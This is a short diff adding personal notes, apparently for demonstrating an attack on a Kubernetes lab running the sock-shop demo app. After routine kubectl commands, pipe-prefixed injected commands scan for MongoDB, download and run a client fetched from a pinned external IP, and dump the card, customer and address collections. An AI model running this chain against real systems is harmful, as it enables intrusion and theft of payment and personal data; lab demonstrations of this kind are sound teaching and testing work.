@@ -1,0 +1,35 @@
+shortcut: strg + shift + x
+
+get cluster info:
+	kubectl cluster-info
+	kubectl get namespace
+
+get pod name:
+	kubectl get pod -n sock-shop
+	kubectl get pod -n bachelor-app
+	
+get service IP:
+	kubectl get service -n sock-shop
+	
+DO IT:
+http://<cluster-ip>:31337
+
+
+| nmap -p27017 --script mongodb-databases <service_ip> -Pn
+
+| curl fastdl.mongodb.org/linux/mongodb-linux-x86_64-4.0.10.tgz --resolve fastdl.mongodb.org:80:52.222.167.194 -O
+| tar -xvf mongodb-linux-x86_64-4.0.10.tgz
+| ./mongodb-linux-x86_64-4.0.10/bin/mongo <SERVICE_IP>
+
+| echo "show dbs" > commands.js
+| cat commands.js
+| ./mongodb-linux-x86_64-4.0.10/bin/mongo 10.110.7.36 < commands.js
+| echo "use users \nshow collections" >> commands.js
+| echo "db.cards.find() \ndb.customers.find() \ndb.addresses.find()" >> commands.js
+
+
+
+
+
+
+
